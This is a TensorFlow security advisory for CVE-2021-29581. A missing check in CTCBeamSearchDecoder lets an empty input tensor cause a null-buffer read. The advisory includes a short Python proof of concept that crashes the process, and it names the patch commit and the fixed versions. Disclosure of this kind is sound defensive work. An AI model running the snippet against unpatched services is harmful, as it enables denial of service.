<h2>TFSA-2021-069: Segfault in <code>CTCBeamSearchDecoder</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29581</p>
<h3>Impact</h3>
<p>Due to lack of validation in <code>tf.raw_ops.CTCBeamSearchDecoder</code>, an attacker can
trigger denial of service via segmentation faults:</p>
<p>```python
import tensorflow as tf</p>
<p>inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)
sequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],
shape=[8], dtype=tf.int32)
beam_width = 10
top_paths = 3
merge_repeated = True</p>
<p>tf.raw_ops.CTCBeamSearchDecoder(
  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,
  top_paths=top_paths, merge_repeated=merge_repeated)
```</p>
<p>The
<a href="https://github.com/tensorflow/tensorflow/blob/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7/tensorflow/core/kernels/ctc_decoder_ops.cc#L68-L79">implementation</a>
fails to detect cases when the input tensor is empty and proceeds to read data
from a null buffer.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e">b1b323042264740c398140da32e93fb9c2c9f33e</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
